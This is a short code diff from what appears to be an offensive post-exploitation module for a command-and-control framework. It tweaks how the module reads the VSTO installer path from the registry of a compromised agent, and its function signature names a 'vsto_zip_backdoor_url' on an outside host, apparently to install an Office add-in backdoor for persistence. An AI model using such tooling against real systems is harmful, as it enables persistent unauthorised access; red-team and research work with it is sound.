@@ -37,11 +37,10 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
     
     # Get VSTO installer path
     opts['command'] = """Get-ChildItem -recurse 'HKLM:\\Software\\Microsoft\\VSTO Runtime Setup' | 
-                         Get-ItemProperty | Select InstallerPath"""
-    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
-    if(".exe" not in results):
+                         Get-ItemProperty | Select InstallerPath | ft -hidetableheaders"""
+    VSTOinstallerpath = API.agent_run_shell_cmd_with_result(agent_name, opts)
+    if(".exe" not in VSTOinstallerpath):
         raise ValueError('No VSTOInstaller')
-    VSTOinstallerpath = results[results.index("C:"):len(results)]
     
     # Get Local App Data path
     opts['command'] = '$env:LOCALAPPDATA'
